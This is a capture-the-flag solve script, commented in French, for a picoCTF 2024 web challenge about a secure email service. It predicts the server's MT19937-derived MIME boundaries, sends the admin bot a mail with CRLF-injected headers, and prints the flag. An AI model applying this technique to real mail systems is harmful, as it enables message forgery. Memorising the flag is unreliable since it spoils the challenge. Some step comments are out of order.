#!/usr/bin/env python3
# 496 - secure-email-service  (Web Exploitation, picoCTF 2024)
# Flag: academy{always_a_step_ahead_fb2a1a8c}
# Write-up: ../../../writeups/web-exploitation/496-secure-email-service.md
# Script exact utilise pour produire le flag.
#
"""496 secure-email-service : run complet.

Instance neuve -> warmup (700 mails pour collecter les boundaries) -> crack MT19937 ->
recalage -> mail piege -> 2 passages du bot -> recolte.

Payload : make_D(B1, B2) avec
  B1 = boundary interne multipart/mixed de la reponse (tirage MT N+1)
  B2 = boundary externe multipart/signed de la reponse (tirage MT N+2)

Usage : python3 solve.py <base_url> [nb_warmup]
Dependances : _z_496_spec.py et _z_496_crack2.py (dans ce dossier)
"""
import sys, os, json, re, time, subprocess, http.client
from urllib.parse import urlparse
sys.path.insert(0, r'.')
from _z_496_spec import make_D, make_subj, PWN

BASE = sys.argv[1].rstrip('/')
WARM = int(sys.argv[2]) if len(sys.argv) > 2 else 700
u = urlparse(BASE)
HOST, PORT = u.hostname, u.port or 80
conn = http.client.HTTPConnection(HOST, PORT, timeout=60)


# --------------------------------------------------------------------------
# Etape 0 : client HTTP keep-alive
#   une seule connexion TCP pour tout le run (le serveur garde un etat par
#   connexion), avec recréation automatique en cas de coupure
# --------------------------------------------------------------------------

def req(method, path, obj=None, token=None):
    global conn
    last = None
    for attempt in range(4):
        try:
            body = json.dumps(obj) if obj is not None else None
            hdrs = {}
            if body is not None:
                hdrs['Content-Type'] = 'application/json'
            if token:
                hdrs['token'] = token
            conn.request(method, path, body=body, headers=hdrs)
            r = conn.getresponse()
            d = r.read().decode()
            if r.status >= 400:
                raise RuntimeError('%s %s -> %s %s' % (method, path, r.status, d[:300]))
            return json.loads(d)
        except (http.client.HTTPException, ConnectionError, OSError) as e:
            last = e
            try: conn.close()
            except Exception: pass
            conn = http.client.HTTPConnection(HOST, PORT, timeout=60)
            time.sleep(0.2)
    raise last


# --------------------------------------------------------------------------
# Etape 1/6 : acces initial
#   GET /api/password ne repond qu'une fois par instance, puis POST
#   /api/login donne le token de user@ses (on le garde dans le JSON local)
# --------------------------------------------------------------------------

pw = req('GET', '/api/password')
tok = req('POST', '/api/login', {'username': 'user@ses', 'password': pw})
json.dump({'base': BASE, 'pw': pw, 'tok': tok}, open(r'./_z_496_remote.json', 'w'))
print('[i] pw', pw, 'me', req('GET', '/api/me', None, tok), flush=True)

# --------------------------------------------------------------------------
# Etape 2/6 : warmup
#   on s'envoie N mails a soi-meme : chaque envoi consomme un tirage du MT19937
#   du serveur, et la boundary MIME du mail EST ce tirage
# --------------------------------------------------------------------------

ids = []
t0 = time.time()
for i in range(WARM):
    ids.append(req('POST', '/api/send', {'to': 'user@ses', 'subject': 'q%d' % i, 'body': 'b'}, tok))
print('[i] warmup %d in %.1fs' % (len(ids), time.time() - t0), flush=True)
# --------------------------------------------------------------------------
# Etape 6/6 : recolte
#   on boucle sur la boite : le mail de reponse du bot contient le flag
# --------------------------------------------------------------------------

emails = req('GET', '/api/emails', None, tok)
rows = []
for eid in ids:
    e = emails.get(eid)
    if e:
        m = re.search(r'boundary="=+(\d+)=+"', e['data'])
        if m:
            rows.append((e['time'], int(m.group(1))))
rows.sort()
print('[i] rows %d dup %d' % (len(rows), len(rows) - len(set(t for t, _ in rows))))
json.dump([b for _, b in rows], open(r'./_z_496_bounds.json', 'w'))

t0 = time.time()
# --------------------------------------------------------------------------
# Etape 3/6 : crack du MT19937
#   crack2.py untemper les valeurs, puis z3 resout l'etat sur deux
#   twists ; on en deduit les prochains tirages (pred.json)
# --------------------------------------------------------------------------

r = subprocess.run(['wsl', '-d', 'kali-linux', '--', 'python3', './_z_496_crack2.py'],
                   capture_output=True, text=True)
print('[i] crack rc=%d %.1fs' % (r.returncode, time.time() - t0), r.stdout.strip().splitlines()[-1][:200])
if r.returncode != 0:
    print(r.stderr[-600:]); sys.exit(1)
preds = json.load(open(r'./_z_496_pred.json'))

# --------------------------------------------------------------------------
# Etape 4/6 : sonde de recalage
#   sa boundary nous dit ou l'on se trouve dans la sequence predite
#   (les mails signes consomment deux tirages, pas un)
# --------------------------------------------------------------------------

pid = req('POST', '/api/send', {'to': 'user@ses', 'subject': 'align', 'body': 'b'}, tok)
em = req('GET', '/api/email/' + pid, None, tok)
got = int(re.search(r'boundary="=+(\d+)=+"', em['data']).group(1))
if got not in preds:
    sys.exit('[!] alignment lost')
NEXT = preds.index(got) + 1
print('[i] aligned probe=preds[%d], exploit will consume preds[%d], reply inner=preds[%d], outer=preds[%d]'
      % (NEXT - 1, NEXT, NEXT + 1, NEXT + 2))

B1 = '=' * 15 + ('%019d' % preds[NEXT + 1]) + '=='
B2 = '=' * 15 + ('%019d' % preds[NEXT + 2]) + '=='
print('[i] B1 =', B1)
print('[i] B2 =', B2)
# --------------------------------------------------------------------------
# Etape 5/6 : mail piege
#   Subject avec CRLF injecte, corps au bon format, et une boundary
#   interne qui reutilise un tirage deja connu du serveur
# --------------------------------------------------------------------------

eid = req('POST', '/api/send', {'to': 'admin@ses', 'subject': make_subj(B1, B2, 'admin@ses'), 'body': 'hello'}, tok)
print('[i] exploit mail', eid, flush=True)

for run in (1, 2):
    t0 = time.time()
    print('[i] bot run %d ->' % run, req('POST', '/api/admin_bot', None, tok),
          '%.1fs' % (time.time() - t0), flush=True)
    time.sleep(1)

for attempt in range(10):
    emails = req('GET', '/api/emails', None, tok)
    for k, e in emails.items():
        d = e['data']
        if re.search(r'(?i)^Subject: pwned', d):
            print('=== FLAG MAIL ===')
            print(d[:3000])
            sys.exit(0)
    print('[i] retry %d inbox=%d' % (attempt, len(emails)), flush=True)
    time.sleep(3)
print('[-] no flag mail')
